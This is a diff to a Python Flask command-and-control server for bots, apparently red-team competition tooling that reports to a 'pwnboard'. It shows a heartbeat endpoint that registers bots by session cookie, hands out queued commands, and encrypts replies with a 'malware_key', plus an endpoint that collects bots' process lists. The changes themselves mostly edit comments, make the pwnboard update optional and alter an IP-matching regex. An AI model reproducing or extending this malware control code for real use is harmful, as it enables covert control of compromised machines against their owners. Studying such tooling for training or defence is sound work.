@@ -3,6 +3,7 @@ import time
 import datetime
 import uuid
 import json
+import re
 
 from flask import request
 import flask
@@ -23,7 +24,7 @@ def heartbeat():
     """
     Beacon heartbeat endpoint
     Used by the bot to check in and get additional commands
-    If there are no commands to execute, returns {"action":"ok"} (OK/NOP)
+    If there are no commands to execute, returns {"action":"ok"} which is an Ok/NOP
     Uses X-Session-ID cookie as a bot UUID
 
     :return: command for bot to execute
@@ -32,6 +33,7 @@ def heartbeat():
         conn = get_db()
         checkin = int(time.time())
 
+        # if request has no cookie, assume this is a new bot and issue it a new X-Session-ID cookie (UUID)
         if 'X-Session-ID' not in request.cookies:
             print("New checkin at " + str(checkin))
             response_json = {}
@@ -47,9 +49,8 @@ def heartbeat():
             return resp
         else:
             id = request.cookies['X-Session-ID']
-            db.add_bot_to_db(conn, id, checkin) # just in case
+            db.add_bot_to_db(conn, id, checkin) # just in case bot isn't in DB (old bot reconnecting)
             db.checkin(conn, id)
-            dbget.get_bot_info(conn, id)
             command = dbget.get_bot_commandqueue(conn, id)[0]
             if command != "":
                 db.update_commandqueue(conn, id, "")
@@ -58,11 +59,13 @@ def heartbeat():
             """
                 This part below updates pwnboard to reflect the beacon
             """
-            nwaddrstring = dbget.bot_ips(conn, id)
-            if nwaddrstring != None and nwaddrstring != []:
-                ips = re.findall(r"10.\d{1,3}\.\d{1,3}\.\d{1,3}", str(nwaddrstring))
-                if len(ips) > 0:
-                    send_update(ips[0], "")
+            if app.pwnboard_enabled:
+                nwaddrstring = dbget.bot_ips(conn, id)
+                print(nwaddrstring)
+                if nwaddrstring != None and nwaddrstring != []:
+                    ips = re.findall(r"192.\d{1,3}\.\d{1,3}\.\d{1,3}", str(nwaddrstring))
+                    if len(ips) > 0:
+                        send_update(ips[0], "")
         action = {}
         action['action'] = Verb.ok.value
         return mal_encode(app.malware_key, json.dumps(action))
@@ -100,7 +103,7 @@ def info():
 @app.route('/ps', methods=['POST'])
 def ps():
     """
-    Endpoint for &-delimited process list
+    Endpoint for JSON-formatted process list
     Updates list in DB accordingly
     :return:
     """
